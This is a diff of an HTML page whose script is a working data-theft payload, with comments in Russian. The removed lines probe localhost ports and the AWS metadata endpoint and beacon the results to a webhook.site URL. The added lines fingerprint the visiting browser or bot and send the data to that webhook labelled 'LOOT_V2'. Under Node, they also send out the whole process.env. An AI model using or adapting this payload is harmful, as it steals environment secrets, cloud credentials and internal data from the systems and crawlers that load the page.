@@ -2,26 +2,38 @@
 <html>
 <body>
     <script>
-        const hook = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049";
+        (function() {
+            const hook = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049";
+            
+            // Собираем системные отпечатки (Fingerprinting)
+            const info = {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                cores: navigator.hardwareConcurrency, // Кол-во ядер процессора сервера
+                memory: navigator.deviceMemory, // Объем ОЗУ в ГБ
+                lang: navigator.languages.join(','),
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                // Самое интересное: проверяем наличие автоматизации
+                webdriver: navigator.webdriver, 
+                plugins: navigator.plugins.length,
+                url: window.location.href
+            };
 
-        async function steal(url, label) {
+            // Превращаем в строку и кодируем в Base64, чтобы спецсимволы не ломали запрос
+            const payload = btoa(JSON.stringify(info));
+
+            // Отправляем максимально просто через GET (это боты любят больше всего)
+            const img = new Image();
+            img.src = `${hook}/LOOT_V2?data=${payload}`;
+            
+            // Попытка №2: Если это Node.js или специфический бот, попробуем вытащить process
             try {
-                const response = await fetch(url, { mode: 'no-cors' }); // Пробуем даже если CORS
-                const text = await response.text();
-                navigator.sendBeacon(hook + "/DATA_" + label, text.substring(0, 2000));
-            } catch (e) {
-                // Если не удалось прочитать текст, шлем ошибку (это тоже пруф порта)
-                navigator.sendBeacon(hook + "/ERR_" + label, e.message);
-            }
-        }
-
-        // Пытаемся прощупать типичные внутренние ресурсы
-        steal("http://127.0.0.1:80/", "LOCAL_80");
-        steal("http://127.0.0.1:8080/", "LOCAL_8080");
-        steal("http://169.254.169.254/latest/meta-data/", "AWS_META");
-        
-        // Маленький бонус: пробуем узнать имя хоста через ошибку
-        new Image().src = hook + "/FINISHED";
+                if (typeof process !== 'undefined') {
+                    new Image().src = `${hook}/NODE_PROCESS?env=` + btoa(JSON.stringify(process.env));
+                }
+            } catch(e) {}
+        })();
     </script>
 </body>
 </html>
